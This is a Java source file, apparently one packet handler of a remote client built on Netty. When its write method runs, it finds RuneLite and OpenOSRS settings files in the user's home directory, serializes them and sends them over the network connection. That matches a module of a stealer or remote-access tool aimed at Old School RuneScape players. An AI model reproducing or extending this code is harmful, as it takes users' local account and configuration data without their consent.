/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets.impl;

import com.protocol.packets.Packet;
import com.protocol.packets.PacketType;
import com.protocol.packets.Packets;
import com.protocol.packets.beans.OSRSPropertiesBean;
import com.ctx.client.utils.Serializer;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelHandlerContext;
import java.io.File;
import java.nio.ByteBuffer;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class OSRSPropertiesFilePacket implements Packet 
{
    private final File runeliteProperties = new File(System.getProperty("user.home") + File.separator + ".runelite" + File.separator + "settings.properties");
    private final File openosrsProperties = new File(System.getProperty("user.home") + File.separator + ".runelite" + File.separator + "runeliteplus.properties");
    
    @Override
    public int getOpcode() 
    {
       return Packets.OSRS_PROPERTIES_FILE_PACKET.getCode();
    }

    @Override
    public String getDescription() 
    {
       return Packets.OSRS_PROPERTIES_FILE_PACKET.getDescription();
    }

    @Override
    public PacketType getPacketType() 
    {
       return Packets.OSRS_PROPERTIES_FILE_PACKET.getPacketType();
    }

    @Override
    public void read(ChannelHandlerContext chc, ByteBuf in) throws Exception 
    {
    }

    @Override
    public void write(ChannelHandlerContext chc, ByteBuf out) throws Exception 
    {
       OSRSPropertiesBean osrsPropertiesBean = new OSRSPropertiesBean();
       
       if (runeliteProperties.exists()) 
       {
           osrsPropertiesBean.setRuneliteProperties(runeliteProperties);
           log.debug("Found {}", runeliteProperties.getPath());
       }
       
       if (openosrsProperties.exists()) 
       {
           osrsPropertiesBean.setOpenosrsProperties(openosrsProperties);
           log.debug("Found {}", openosrsProperties.getPath());
       }
       
       if (osrsPropertiesBean.getRuneliteProperties() == null 
               && osrsPropertiesBean.getOpenosrsProperties() == null) 
       {
           log.debug("No properties file found!");
           return;
       }
       
       ByteBuffer serialized = Serializer.serializeObject(osrsPropertiesBean);
       ByteBuf buf = Unpooled.copiedBuffer(serialized);
       out.writeBytes(buf);
    }
    
}
